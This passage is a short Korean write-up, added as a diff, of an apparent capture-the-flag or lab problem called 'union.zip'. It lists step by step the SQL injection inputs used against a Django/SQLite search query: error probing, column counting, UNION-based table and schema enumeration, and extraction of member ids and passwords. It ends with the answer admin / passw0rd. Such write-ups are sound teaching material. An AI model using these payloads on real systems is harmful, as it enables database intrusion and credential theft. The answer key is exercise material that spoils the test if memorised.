@@ -1,0 +1,43 @@
+union.zip 문제
+
+
+1. 공격에 사용한 쿼리문 순서대로
+
+  1) 에러 메세지 확인을 통하여 프레임워크및 db 종류 확인
+
+입력값: '
+
+  출력 내용: Django 프레임워크, sqlLite3
+
+  query = "select * from profile where name '%" + name + "%';"
+
+  로 작성 되어 있는걸 확인
+
+  2) 사이트의 칼럼의 개수를 찾는 쿼리
+
+  'order by 5 --
+
+ 3) 자료형 파악
+
+  'union select 'a', 1, 'c', 'd', 1 
+
+  4) 테이블명 찾기
+
+  'union select tbl_name, 1, 'c', 'd', 1 from sqlite_master --
+
+  5) member 테이블의 컬럼명 구문
+
+PRAGMA table_info
+
+  'union select sql, 'a', 'a', 'a', 'a' from sqlite_master --
+
+  6) 데이터 추출
+
+  'union select id, password, 0, 0 , 0 from member --
+
+
+
+2. 정답
+
+관리자 아이디: admin
+비밀번호: passw0rd
